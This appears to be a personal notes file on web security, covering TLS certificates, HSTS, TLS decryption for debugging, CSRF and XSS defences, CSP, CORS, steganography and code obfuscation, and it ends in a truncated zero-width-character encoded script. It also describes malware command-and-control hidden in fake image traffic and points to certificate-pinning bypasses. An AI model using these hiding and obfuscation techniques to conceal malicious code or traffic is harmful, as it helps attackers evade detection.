- [HTTP Strict Transport Security - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security) and [HSTS Preload Submission](https://hstspreload.appspot.com/)
- [HTTP Public Key Pinning - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning)
- [Robert Love · Blog: Everything you Need to Know about HTTP Public Key Pinning (HPKP)](http://blog.rlove.org/2015/01/public-key-pinning-hpkp.html)
- [Cool Solutions: Decrypting SSL Traffic to Troubleshoot NAM](http://www.novell.com/coolsolutions/appnote/19321.html)
- [The First Few Milliseconds of an HTTPS Connection](http://www.moserware.com/2009/06/first-few-milliseconds-of-https.html)
- [A basic guide to when and how to deploy HTTPS — Erik Romijn](http://erik.io/blog/2013/06/08/a-basic-guide-to-when-and-how-to-deploy-https/)
- [5 easy tips to accelerate SSL – Unhandled expression](https://unhandledexpression.com/2013/01/25/5-easy-tips-to-accelerate-ssl/)
- [cryptography - "Diffie-Hellman Key Exchange" in plain English - Information Security Stack Exchange](http://security.stackexchange.com/questions/45963/diffie-hellman-key-exchange-in-plain-english/45971)
- [Nick Craver - HTTPS on Stack Overflow: The End of a Long Road](https://nickcraver.com/blog/2017/05/22/https-on-stack-overflow/)
- [HTTPS : de SSL à TLS 1.3 | Openweb.eu.org](https://openweb.eu.org/articles/https-de-ssl-a-tls-1-3)
- [How to Use SSL/TLS with Node.js — SitePoint](https://www.sitepoint.com/how-to-use-ssltls-with-node-js/)
- [Understanding the Limitations of HTTPS | text/plain](https://textslashplain.com/2018/02/14/understanding-the-limitations-of-https/)
- [Why do we need HTTPS? - How HTTPS works](https://howhttps.works/why-do-we-need-https/)

###### Self-signed certificate

For *.localhost domains see [mkcert: valid HTTPS certificates for localhost](https://blog.filippo.io/mkcert-valid-https-certificates-for-localhost/)

Create an self-signed certificate (SSC)

	# Create self signed certificate for 10 years (no use shorter validity for production):
	# Inline openssl extension config file:
	openssl req -newkey rsa:4096 -x509 -days 3650 -sha256 -config <(echo -e "[req]\ndistinguished_name=dn\n[dn]\n[ext]\nbasicConstraints=CA:false\nsubjectAltName=DNS:*.domain.com") -extensions ext -nodes -subj "/C=FR/ST=IDF/L=Paris/O=ACME/OU=Development/CN=*.domain.com/emailAddress=admin@domain.com" -keyout .domain.com.key -out .domain.com.crt
	# For subjectAltName syntax see http://blog.endpoint.com/2013/10/ssl-certificate-sans-and-multi-level.html
	# subjectAltName=DNS=*.domain.com
	# -subj ".../.../subjectAltName=DNS.1=example.com, DNS.2=www.example.com, DNS.3=billing.example.com"

	# Read certificate
	openssl x509 -text -noout -in domain.ext.crt

`-nodes` (no DES): the created private key is it will not be encrypted. Usefull on a webserver. Else it require after each reboot to provide or store the password to decrypt the private key.

Self-signed CA vs self-signed certificate:

- self-signed certificate. Install it in the root keystore of the client and the server use it.
- self-signed CA certificate (Certifying Authority certificate, require [X.509 Basic Constraints](https://tools.ietf.org/html/rfc5280#section-4.2.1.9) `CA=TRUE`), used to sign a certificate (end entity cert). Install the root cert in the root keystore of the client and the server use the entity cert.
- self-signed CA certificate, signed intermediate certificate and a end-entity cert.

Note: Android require Basic constraints extension ("CA flag") to be set to `TRUE`.
Note: Chrome 58 and Firefox 48 require Subject Alternative Name (SAN) (`subjectAltName`) for the domain(s) name(s), to define all domains used by this certificate

- [ssl - Difference between self-signed CA and self-signed certificate - Stack Overflow](https://stackoverflow.com/questions/4024393/difference-between-self-signed-ca-and-self-signed-certificate)
- [Self-signed SSL certificates, CA flagged true, for Android and OS X | Best Mac Tips](http://best-mac-tips.com/2015/05/28/self-signed-ssl-certificates-ca-true-android-os-x/)
- [Des certificats signés par votre autorité de certification avec OpenSSL - Jeyg.info](http://jeyg.info/des-certificats-signes-par-votre-autorite-de-certification-avec-openssl/)
- [OpenSSL CA and non CA certificate - Super User](https://superuser.com/questions/462295/openssl-ca-and-non-ca-certificate)
- [OpenSSL (Keys and Certificates) · HOWTO setup a small server · Ch. Schneider](http://chschneider.eu/linux/server/openssl.shtml)
- [certificates - SSL/TLS: Policy Constraints vs. Basic Constraints - Information Security Stack Exchange](https://security.stackexchange.com/questions/110686/ssl-tls-policy-constraints-vs-basic-constraints)
- [A Web PKI x509 certificate primer - Mozilla | MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Security/x509_Certificates)
- [ssl - How to create a self-signed certificate with openssl? - Stack Overflow](https://stackoverflow.com/questions/10175812/how-to-create-a-self-signed-certificate-with-openssl/27931596#27931596)
- [OpenSSL man page: req](https://www.openssl.org/docs/manmaster/man1/req.html)
- [Chrome: Invalid self signed SSL cert - "Subject Alternative Name Missing" - Stack Overflow](https://stackoverflow.com/questions/43665243/chrome-invalid-self-signed-ssl-cert-subject-alternative-name-missing)
- [Fixing Chrome 58+ \[missing_subjectAltName\] with openssl when using self signed certificates | Alexander Zeitler](https://alexanderzeitler.com/articles/Fixing-Chrome-missing_subjectAltName-selfsigned-cert-openssl/)
- [FAQ/subjectAltName - CAcert Wiki](http://wiki.cacert.org/FAQ/subjectAltName)
- [CertSimple | Your OpenSSL CSR command is out of date](https://certsimple.com/blog/openssl-csr-command)
- [CertSimple | Never see localhost HTTPS warnings again](https://certsimple.com/blog/localhost-ssl-fix)
- [How to Setup HTTPS Locally Without Getting Annoying Browser Privacy Errors](https://deliciousbrains.com/https-locally-without-browser-privacy-errors/)
- [How to get HTTPS working on your local development environment in 5 minutes](https://medium.freecodecamp.org/how-to-get-https-working-on-your-local-development-environment-in-5-minutes-7af615770eec)

###### HTTP Strict Transport Security

Aka HSTS

Force TLS (HTTPS), in `.htaccess`:

	# 2 years
	Header always set Strict-Transport-Security "max-age=63072000; includeSubdomains; preload"

Should redirect HTTP to HTTPS first, then the browser remember it.

- [HTTP Strict Transport Security — Wikipedia](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
- [HTTP Strict Transport Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet)
- [Strict-Transport-Security - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [HSTS](htaccess#hsts)
- [How to clear HSTS Settings in Major Browsers | that's so … classically.me](http://classically.me/blogs/how-clear-hsts-settings-major-browsers) - Chrome / Opera: `chrome://net-internals/#hsts`, Safari: `~/Library/Cookies/HSTS.plist`, Firefox `%firefox_profile%/SiteSecurityServiceState.txt`

Firefox:

- Regular browsing mode: HSTS persists across sessions.
- Private browsing mode: HSTS information are deleted after the session.

###### Decrypt TLS

`SSLKEYLOGFILE`
`sudo tcpdump -i en0 -s 0 tcp port https -w ~/Desktop/capture.pcap`
Chrome [`--ssl-key-log-file=file`](https://peter.sh/experiments/chromium-command-line-switches/#ssl-key-log-file)

- [NSS Key Log Format - Mozilla | MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Key_Log_Format)
- [Decrypting TLS Browser Traffic With Wireshark – The Easy Way! | Jim Shaver](https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/)
- [TLS Master Secrets — mitmproxy 2.0.2 documentation](https://mitmproxy.readthedocs.io/en/v2.0.2/dev/sslkeylogfile.html)
- [Inspect curl’s TLS traffic | daniel.haxx.se](https://daniel.haxx.se/blog/2018/01/15/inspect-curls-tls-traffic/)
- [SSL key logging (aka SSLKEYLOGFILE) – Welcome to the Windows developer feedback site!](https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/16310230-ssl-key-logging-aka-sslkeylogfile)
- [Article: K10209 - Overview of packet tracing with the ssldump utility](https://support.f5.com/csp/article/K10209)
- [Chrome not Firefox are not dumping to SSLKEYLOGFILE variable - Stack Overflow](https://stackoverflow.com/questions/42332792/chrome-not-firefox-are-not-dumping-to-sslkeylogfile-variable)
- [CertPinning - Fiddler](http://fiddler.wikidot.com/certpinning)
- [Bypassing OpenSSL Certificate Pinning in iOS Apps](https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/january/bypassing-openssl-certificate-pinning-in-ios-apps/) - Doesn't work on recent iOS versions

#### Cookie-to-Header Token

**It's based on the assumption that only JavaScript running within the same origin will be able to read the cookie's value.**

	fetch(url, {
		credentials: "include",
		mode: "cors",
		headers: {
			"Accept": "application/json",
			"X-Csrf-Token": getCookieValue("Csrf-token")
		}
	});

- [Cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Cookie-to-Header_Token)

#### XSS and injection prevention

For HTML, use:

- `crossorigin` attribute for [`<script>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-crossorigin), [`<img>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img#attr-crossorigin)
- `noopener`
- `Content-Security-Policy: frame-ancestors 'self'` header (or the depreciated `X-Frame-Options: SAMEORIGIN`)
- `X-Content-Type-Options: nosniff` header (discard content detection = use only `Content-Type` header)
- [Subresource Integrity](#subresource-integrity)
- [Content Security Policy](#content-security-policy)
- [Cross-Origin Resource Sharing](#cross-origin-resource-sharing)
- use `SameSite=Strict` cookies

- add a timestamp (use it also to create the "nonce") and check the diff time (depends how much input number is), a user require a minimum of few seconds
- Other prevention techniques [Cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention)
- use a [nonce](https://en.wikipedia.org/wiki/Cryptographic_nonce) (see Wordpress `wp_create_nonce()`) field to protect against CSRF (Cross-Site Request Forgery)
- [Cookies for Comments — WordPress Plugins](https://wordpress.org/plugins/cookies-for-comments/)
- (require cookies) add unique image/js/css resource (`<script src="script.php?UNIQ_ID"></script>`), when this resource is called add a cookie. When the form is POST, check if the cookie exist

For JSON, use (affect only old browsers):

- proper headers: `Content-Type: application/json` and `x-content-type-options: nosniff`
- [AJAX Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet#Protect_against_JSON_Hijacking_for_Older_Browsers)
- [jquery - Is it possible to XSS exploit JSON responses with proper JavaScript string escaping - Stack Overflow](https://stackoverflow.com/questions/3146324/is-it-possible-to-xss-exploit-json-responses-with-proper-javascript-string-escap)
- prefix with `for(;;);` or `)]}'`
- [Polyglot JSON - JS file](#polyglot-json---js-file)

See also

- [Polyglot HTML - JPEG file](#polyglot-html---jpeg-file)
- [DOM clobbering](#dom-clobbering)
- [Cross-site scripting — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
- [Link types - HTML | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types)
- [Source-Breaking Injections - Fooling the Interpreter](http://brutelogic.com.br/blog/source-breaking-injections/)
- [Things to Know (and Potential Dangers) with Third-Party Scripts | CSS-Tricks](https://css-tricks.com/potential-dangers-of-third-party-javascript/)
- [javascript - Could anyone explain these XSS test strings? - Stack Overflow](https://stackoverflow.com/questions/25461418/could-anyone-explain-these-xss-test-strings)
- [ArticlesXSS - doctype-mirror - Articles about web security - Mirror of Google Doctype - Google Project Hosting](https://code.google.com/p/doctype-mirror/wiki/ArticlesXSS)
- [php - Is json_encode Sufficient XSS Protection? - Stack Overflow](https://stackoverflow.com/questions/12062146/is-json-encode-sufficient-xss-protection)
- [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC)
- `SameSite` cookies CSRF tokens [GitHub’s post-CSP journey - GitHub Engineering](https://githubengineering.com/githubs-post-csp-journey/#same-site-cookies)
- Prevention of [cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention)
- [Cryptographic nonce — Wikipedia](https://en.wikipedia.org/wiki/Cryptographic_nonce) (see Wordpress `wp_create_nonce()`)
- [Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet)
- [Same-origin policy — Wikipedia](https://en.wikipedia.org/wiki/Same-origin_policy)
- [Same-origin policy - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/)
- [s0md3v/XSStrike: Most advanced XSS detection suite.](https://github.com/s0md3v/XSStrike)

##### Subresource Integrity

Use `integrity` attribute for `<script>` and `<link>`

- [Subresource Integrity](https://www.w3.org/TR/SRI/)
- [Subresource Integrity - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)

##### Cross-Origin Resource Sharing

Aka CORS

Note: Be carefull and don't mix `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` without know what your are doing

`Access-Control-Allow-Origin: *` means [“anonymous requests only”](https://w3c.github.io/webappsec-cors-for-developers/#anonymous-requests-or-access-control-allow-origin)

- [HTTP access control (CORS) - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS)
- [Using CORS - HTML5 Rocks](http://www.html5rocks.com/en/tutorials/cors/)
- [Cross-Origin Resource Sharing](https://www.w3.org/TR/cors/)
- [cors - What exactly does the Access-Control-Allow-Credentials header do? - Stack Overflow](https://stackoverflow.com/questions/24687313/what-exactly-does-the-access-control-allow-credentials-header-do/24689738#24689738)
- https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_settings_attributes
- [Using CORS policies to implement CSRF protection | Mixmax Engineering Blog](https://mixmax.com/blog/modern-csrf)
- [the frontendian](https://frontendian.co/cors)
- [Do You Really Know CORS? – PerformantCode.com](http://performantcode.com/web/do-you-really-know-cors)

##### Content Security Policy

Aka CSP

**Note: URIs in directives sources can't contains `;` nor `,`**

Facebook CSP example:

	Content-Security-Policy: default-src * data: blob:;script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* 'unsafe-inline' 'unsafe-eval' fbstatic-a.akamaihd.net fbcdn-static-b-a.akamaihd.net *.atlassolutions.com blob: data: chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl;style-src * 'unsafe-inline' data:;connect-src *.facebook.com *.fbcdn.net *.facebook.net *.spotilocal.com:* *.akamaihd.net wss://*.facebook.com:* https://fb.scanandcleanlocal.com:* *.atlassolutions.com attachment.fbsbx.com ws://localhost:* blob: 127.0.0.1:*;

See also as example GitHub ultra strict CSP.

Exception of inline script and style can be made with `script-src` and `style-src` by using a checksum/hash of source code of inlined script. Note: nonce can also be used, but not recommended. See [Content Security Policy Level 2](https://www.w3.org/TR/CSP2/#script-src-hash-usage)

- [Subresource checksum](Web#subresource-checksum)
- [Content-Security-Policy - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [Making CSP great again! - Michele Spagnuolo and Lukas Weichselbaum // Speaker Deck](https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum)
- [GitHub’s CSP journey - GitHub Engineering](https://githubengineering.com/githubs-csp-journey/)
- [GitHub’s post-CSP journey - GitHub Engineering](https://githubengineering.com/githubs-post-csp-journey/)
- [CSP Tester](https://jeffersonscher.com/res/csp-tester.php)
- [Content Security Policy Playground](http://www.cspplayground.com/home)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Content Security Policy — Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [Implementing Content Security Policy ★ Mozilla Hacks – the Web developer blog](https://hacks.mozilla.org/2016/02/implementing-content-security-policy/)
- [Content Security Policy CSP Reference & Examples](https://content-security-policy.com/)

#### JSONP

**Avoid using JSONP on sensitive domains. Use a dedicated sandbox domain.**

Use `X-Content-Type-Options: nosniff` and `Content-Type: application/javascript`. Return something like `/**/ typeof CALLBACK === "function" && CALLBACK(JSONP_RESPONSE);`, where `CALLBACK` is the callback name and `JSONP_RESPONSE` is the response

- [Abusing JSONP with Rosetta Flash](https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/)

#### Image forensic

Find hidden data of faked data (ex: image):

- [FotoForensics](http://fotoforensics.com/)
- [Fool Me Once - The Hacker Factor Blog](http://www.hackerfactor.com/blog/?/archives/478-Fool-Me-Once.html)
- [bh-usa-07-krawetz-wp.pdf](https://www.hackerfactor.com/papers/bh-usa-07-krawetz-wp.pdf)
- [FotoForensics - FAQ](http://fotoforensics.com/faq.php?show=General&c=guidelines)
- [TinEye Reverse Image Search](https://www.tineye.com/)
- [Forensically, free online photo forensics tools - 29a.ch](https://29a.ch/photo-forensics/)
- [Ghiro - automated digital image forensics tool](http://www.getghiro.org/) - see https://github.com/ghirensics/ghiro
- [An Overview on Image Forensics](https://www.hindawi.com/journals/isrn/2013/496701/)

#### Hide data

Note: code is also data

**It's impossible to prevent access to data provided to untrusted parties, NEVER!** It's too late.

The reader / browser / VM must be able to read your files and since it has no idea of what encryption you use, you must "load" a encrypted file, and the algorithm of your encrypted file is in the loader. But what do you do with the loader itself then?

- encryption (AES / XOR / ROT…) on the value in memory
- encryption (AES / XOR / ROT…) on the packets
- Encrypted Files (code) in conjunction with super high code obfuscation of preloader.
- isolate code/class definition/context and checking for existing definition
- Memory Hacking Prevention, String & Binary Obfuscation, binary level obfuscation, key encrypting
- use different radix, etc.:

		"A" == "1000001" == "	     	"

		// ascii string to whitespaces
		"Hello"
			.replace(/./g, function(w){return w.charCodeAt(0).toString(2).padStart(7, "0").replace(/0/g, ' ').replace(/1/g, "	")})
		// whitespaces to ascii string
		"	  	   		  	 			 		  		 		  		 				"
			.replace(/.{7}/g, function(w){return String.fromCharCode(parseInt(w.replace(/ /g, "0").replace(/	/g, "1"), 2))})
	See [javascript - Detect when "Inspect Element" is open - Stack Overflow](https://stackoverflow.com/questions/42193700/detect-when-inspect-element-is-open/42194142#comment71551031_42194142)
 
	class Test {
		static function main() {
			var ldr:Dynamic = new flash.display.Loader();
			var ba:flash.utils.ByteArray = new flash.utils.ByteArray();
			for (i in Data.data) {
				ba.writeByte(i-1); // secret de-obfuscation algorithm: i - 1
			}
			ldr.loadBytes(ba);
			flash.Lib.current.addChild(ldr);
		}
	}

Hidden text part can be recovered if short parts missing:
![DW19QBdWsAAPCJk.jpeg](./Data access and integrity/Prevent and detect violation/DW19QBdWsAAPCJk.jpg)
[Tom 7 on Twitter: "Redaction pro-tip: Most short word will have distinct length in a proportional font like Time New Roman. I think it' pretty clear, but decide for yourself...
(Thi i the Democratic "rebuttal" #memo unclassified today, page 3.)… https://t.co/eQvmiDwL1M"](https://twitter.com/tom7/status/967568358861430785)


##### Steganography

See also [Alternative data storage](#alternative-data-storage)

Hide data in data or metadata in a carrier format (image, video, etc.)

- append data at the end of file (or the begin, for format that support it)
	- easy detectable, file size
- hiding data in junk field
	- can be easily detectable for dedicated comment fields (or metadata)
	- add use larger fields (exemple: use 16bits palette instead of 8bits, give extra data)
- hidding data in LSB's (Least significant bit), minor offset values
	or Selected Least Significant Bit, LSB matching, etc.
	- doesn't impact file size
	
	- [Intensity Adaptive LSB Method Applying a Revised Matching - pxc3888468.pdf](http://research.ijcaonline.org/volume70/number27/pxc3888468.pdf)
- palette manipulation
	Reduce colors and duplocate palette entries, allow to create an other image by swapting palette
- encrypt before hide (reduce visual detection of LSB)
- spread hidden data over all bytes, not only in first bytes. Use a noise function to put interval between hidden data (Frequency space manipulation).
- don't hide in repeated data (image without enought contrasts, etc.)

- [stegosploit_pocgtfo8_submission](http://stegosploit.info/)
- SVG is a vector format, this allow to draw elements or vectorized texts in very small size to hide in in the image
- Corrumpt deliberately your files. Only you can restore it
	- [ImpulseAdventure - Fix Corrupt JPEG Photos!](http://www.impulseadventure.com/photo/fix-corrupt-jpeg-photo.html)
- Use unused colors in an image palette to encore data
	Limited to few bytes, max 256 colors = store data potential 765 Bytes max (255 * 24 bits)
- Recive C&C instructions by send HTTP request with absolute URI `GET http://example.com` to an IP address (which not related to the requested domain). Can send data by faking upload of a fake JPEG (only headers). [Dimnie: Hiding in Plain Sight](http://researchcenter.paloaltonetworks.com/2017/03/unit42-dimnie-hiding-plain-sight/)
	-> fake proxy recieve the HTTP request, response with a fake image contains instructions
	act as if it's was a regular HTTP traffic
- Store image / audio data in an audio / image format (lossy or lossless)
	Lossy can destroy too much information. Because audio and image/video codecs are adpated to human senses limitation ([auditory masking](https://en.wikipedia.org/wiki/Auditory_masking), chroma reduction: eye is less sensitive to fine color details than to fine brightness details, etc.)

	- [MP3 for Image Compression (2006) | Hacker News](https://news.ycombinator.com/item?id=14133221)
	- [Avian’s Blog: Lossy compression](https://www.tablix.org/~avian/blog/archives/2006/01/lossy_compression/)
	 
		sox mo.wav -e unsigned -b 8 -c 1 -r 48k mo.raw
		bytes=`stat -f %z mo.raw`
		width=`echo sqrt\($bytes\) | bc`
		square_bytes=`echo $width \* $width | bc`
		dd if=mo.raw of=mo_square.raw bs=$square_bytes count=1
		gm convert -depth 8 -size ${width}x${width} gray:mo_square.raw -quality 50 mo_square.jpg
		gm convert mo_square.jpg gray:mo_square_jpg.raw
		sox -e unsigned -b 8 -c 1 -r 48k -t raw mo_square_jpg.raw mo_jpg.wav

- [Windowlicker — Wikipedia](https://en.wikipedia.org/wiki/Windowlicker)
- [wbStego Steganography Tool](http://wbstego.wbailer.com/)
- [Steganography — Wikipedia](https://en.wikipedia.org/wiki/Steganography)
- [Steghide](http://steghide.sourceforge.net/) - steganography program that hide data in JPEG, BMP, WAV and AU files
- [nullcon 2010 - Steganography & Stegananalysis: A Technical & Psycholo…](https://www.slideshare.net/null0x00/nullcon-2010-steganography-stegananalysis-a-technical-psychological-perspective)
- [» Secure Printing «](https://engineering.purdue.edu/~prints/publications.shtml) - Fingerprint / watermarks of printed or scanned documents
- [albinoloverats ~ stegfs](https://albinoloverats.net/projects/stegfs) - steganographic file system (use FUSE)
- [StegoShare — Wikipedia](https://en.wikipedia.org/wiki/StegoShare#Use_in_the_file_sharing_networks) - Use in the anonymous file sharing networks to transmit data
- [OpenPuff - Steganography & Watermarking](http://embeddedsw.net/OpenPuff_Steganography_Home.html) - steganography tool. See [OpenPuff — Wikipedia](https://en.wikipedia.org/wiki/OpenPuff)
- [ZEDZ.NET: purveyors of crypto since 1994.](http://zedz.net/) ftp://ftp.zedz.net/pub/security/steganography/ zedz.net/wiretapped.net Stenography examples (local copy in "zedz.net steganographic software")
- [owencm/js-steg: Javascript JPEG steganography library. Includes JS JPEG encoder and decoder with coefficient access helper functions.](https://github.com/owencm/js-steg)
- [Punk Ode: Hiding Shellcode in Plain Sight](https://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Sutton.pdf)

###### Hide data in text

In document, user's comment, chat message, source code / script, source code's comment, source code variable name or value (strings), etc.

- using white spaces, lookalike chars substitution (confusable homoglyphs), diacritic, capitalization, unicode escape sequences and the differents way to encode it (ex. for HTML: `&#233;` vs `&#x00E9;` vs `&eacute;` vs `é`, etc. vs non escaped chars), surrogate pairs, etc.
	- https://github.com/reinderien/mimic and https://github.com/reinderien/mimic/wiki/Character-Set
	- [A tool can compress JavaScript code to any ascii image and still run normally](https://github.com/xinyu198736/js2image)
	- [Off-side rule — Wikipedia](https://en.wikipedia.org/wiki/Off-side_rule#Off-side_rule_languages)
	- [Whitespace (programming language) — Wikipedia](https://en.wikipedia.org/wiki/Whitespace_%28programming_language%29)
	- [Voidmaker - JSFiddle](https://jsfiddle.net/Lcjo35h4/1/)
	- Ruby annotation are usally not visible
		> They tend not to have any rendering in fonts, since they’re control characters, and Unicode actually recommends they not be exposed directly to users at all, so there are no rules for how to actually display them
	
		`<ruby><rb>日本語</rb><rp>（</rp><rt>にほんご</rt><rp>）</rp></ruby>` `[U+FFF9]日本語[U+FFFA]にほんご[U+FFFB]`
	- Unicode decomposition `"한글" !== "한글"` `"ㅎㅏㄴ ㄱㅡㄹ"`
	- http://www.unicode.org/Public/security/latest/confusables.txt see [UTS #39: Unicode Security Mechanisms](http://www.unicode.org/reports/tr39/#confusables)
	- [vhf/confusable_homoglyphs: ϲοｎｆｕѕаｂｌе＿һοｍоɡｌｙｐｈｓ](https://github.com/vhf/confusable_homoglyphs)
- Zero width chars:

		<!-- [SmallestJS](http://schierlm.users.sourceforge.net/smallestjs.html) -->
		<!-- Use zero-width (invisible as text) chars: U+200D, U+FEFF, U+200C, U+200B -->
		<meta charset="UTF-8"><script>q="﻿‌‍​﻿‌​​﻿‌​‌﻿​‍​﻿​﻿‍﻿​‍‌﻿​﻿﻿﻿‌‍​﻿​﻿‍﻿‌​​﻿​‍‌﻿﻿​​‍​​﻿‍‌﻿​‍‍﻿﻿﻿﻿﻿​‍​​﻿﻿﻿​‍‍‌﻿​‍​​‍﻿‌​﻿﻿‍​‍﻿‌‍﻿‍﻿​​‍‍﻿​﻿‍​﻿﻿‌﻿‌‍‌​﻿‍​‌‍﻿​​​‍​​‍‍﻿﻿​﻿​‍﻿‍‍﻿​‍‌‍​‍‌‍‌‍​‌​﻿‌​‍‍​​﻿﻿​‍﻿‍‍‌​‍​‌​﻿​‍​‍‍﻿​﻿​​‍‍﻿‍‌﻿﻿‍﻿﻿‌​‍‍​‌​﻿‌‌﻿‍‌‌​‍​​﻿‍​﻿‍‍‌‌﻿‍﻿‍‍﻿​‌​﻿​﻿​‍‍﻿​‍﻿‍‌‍‍​‌﻿​﻿​‍‌‌​‍​​﻿‍‌‌‍﻿​‍﻿﻿‍﻿​‍‌‌​﻿‌‌‌‍‌‌﻿‍‌‌‌‍​﻿﻿‍‌​​‍​‍‌‍‌‌﻿‍‌﻿‌‍​‍​﻿​​﻿‍​‌​﻿​‍﻿‍‌‌​‍‍﻿‌‍﻿‍‍﻿​‍‍﻿‍‌​﻿​‍​﻿‌﻿﻿﻿‍‌﻿‍‌﻿‍‍‌‌‍﻿​﻿​‍‌​‍‍​﻿‍‍‌‌﻿‍‌‌﻿﻿​​﻿‍​‌​﻿‌‍​‍​​﻿﻿﻿‍‌‍‌​‍﻿‌​‍‍‌‌​‍​‍﻿‍​‍﻿‍﻿﻿‌﻿‌‍​﻿﻿‌​﻿‌‍​﻿﻿​﻿﻿﻿‌​﻿‌‍​﻿﻿​﻿‍‌‌‍﻿﻿‍‌‍‌‌​‍​‍﻿‍​‍﻿‍‌‌﻿‍‌‌﻿‍‌‌‍‍﻿﻿‌‍‌‍‍‍‌​​‍‌​​‍‌‍‍﻿‌‍‌﻿​‌﻿‍‌‍‍﻿‍‍‍‍﻿‍​‍‍​​‍﻿﻿​﻿﻿​‍‍‌﻿​‍​‌​‍‍﻿﻿﻿‌‍​‍‍﻿‍‍​​﻿﻿‌﻿‌﻿​﻿﻿﻿‌​‌﻿‌‍​﻿​﻿‍﻿‌‌﻿﻿﻿‍‍‍‌‌‍‍‌‌﻿‍‌‍‍﻿​‌​‍‍﻿﻿‍﻿​﻿﻿​‍‌‍‍﻿​﻿‌‍​﻿﻿‍‍‍﻿​﻿﻿​‍‌﻿​﻿﻿﻿‌‍​﻿​﻿‍﻿‌​​﻿​‍‌‍‌‍‌‍‌‌​‍‍‍‌‍﻿​‌‍‍‌‍‍​​​‍﻿‌﻿‍​‌​‍‍﻿﻿﻿‌​﻿﻿‌‍﻿﻿​‍‍‍‍﻿‌﻿﻿​​‍​﻿﻿‍‌​‍‍​﻿‌‍​﻿﻿‍​‍‌‍​﻿​‍​‌﻿‍‌​‍﻿﻿​​‍​﻿‍‍‌​‍﻿﻿​​‍​‍​‍﻿﻿‌‍‍﻿﻿‍﻿‍﻿‍‍﻿​‍﻿‍‌‍‍﻿﻿﻿﻿‍﻿‍﻿​﻿﻿​‍‌‍‍‌​‍​‌​﻿‌‌﻿‍‌‌​‍‌‌​‍‌‌﻿﻿​‌​‍‍﻿﻿﻿‌‍‌‍‍﻿​‍​‍‍‍​‍‍‍​‍‍‍​‍‍‍‌‍‌‍‌‌​‍﻿​﻿﻿​‍‌﻿‍﻿​‍‌‌﻿‍‌​‌﻿​﻿‍﻿‌​​﻿﻿‍​‍‍‌﻿‍‌‌‍‍​﻿‍‍﻿﻿‌‍﻿‍﻿‍‌‌​‍​​﻿﻿‌‍‌‍‌​‌﻿​​‍‍‌‌‍﻿‌‍‌‍‍‌​‍‌​﻿‍​﻿‍‍﻿﻿‌﻿​​﻿﻿‌‍‍‍‌‌‍‍‍﻿﻿‍‍​‌‍﻿‍﻿‍​​﻿‍﻿‍﻿‍‌‍﻿‍‌‍‌‍‌‌​﻿‌‌‌‍‌‌﻿‍‌​‌﻿‌‌‌﻿‌​​‍﻿​‌‍‌‌‍﻿‌​﻿﻿‌‍﻿﻿​‍‍﻿﻿‌​﻿‌‌‌﻿﻿​﻿‍﻿﻿‌﻿​​﻿‍‍‍‌﻿‌​​﻿‍​﻿‍‍‌‍‍​​​‍﻿‌﻿‍​​﻿﻿﻿﻿​‍‌‍﻿‍‌‍​‍​​​﻿‌‌‌﻿‌​​‍﻿​‌‍‌‌‍‍﻿‍﻿‍﻿﻿‌﻿​​﻿‍​‌​‍﻿‌‌﻿​﻿​﻿‍​‌‍﻿﻿﻿‍‌‌‍﻿﻿​‍‍‌﻿​‍​​‍﻿﻿‌‌﻿‌​﻿﻿‌​‍‍‍‍﻿﻿​​‌‍﻿​﻿﻿​‌﻿‍﻿​‍‍​​‌‍﻿‍‍﻿‌‍‌﻿﻿‌﻿﻿​‌﻿﻿​‌​﻿‌﻿‌﻿‌​​‍‌﻿‍‍‌​﻿﻿‌﻿‌﻿‌‍﻿﻿‌​﻿﻿‌‌﻿﻿‌​‍﻿​‌﻿‍​‌‌﻿﻿﻿‌﻿﻿​‌﻿‌﻿‍﻿‌‍﻿﻿‌​‌﻿‌‍﻿‍‌​‍﻿‍‍﻿﻿‍​‌﻿‌‍﻿﻿‌​‍‍‌​‍﻿‍‌‍﻿‌﻿﻿﻿‌​‍﻿​﻿